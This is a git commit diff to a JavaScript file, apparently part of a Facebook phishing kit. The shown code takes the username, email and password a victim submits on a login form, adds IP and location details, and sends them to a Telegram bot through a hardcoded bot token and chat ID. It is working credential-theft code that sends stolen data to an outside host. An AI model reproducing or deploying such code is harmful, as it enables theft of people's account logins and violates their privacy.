1a2134314abf420f5d22d11d045c40009adf17cf
Phyllova <127481743+phyllova@users.noreply.github.com>
2024-12-06 05:47:22 -0800

    init commit

--- js/sendere.js
+++ js/sendere.js
@@ -21,7 +21,7 @@ form.addEventListener("submit", (e) => {
       var my_text = `Facebook Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
       var token = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
-      var chat_id = -1666157643;
+      var chat_id = 1666157643;
       var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
       let api = new XMLHttpRequest();
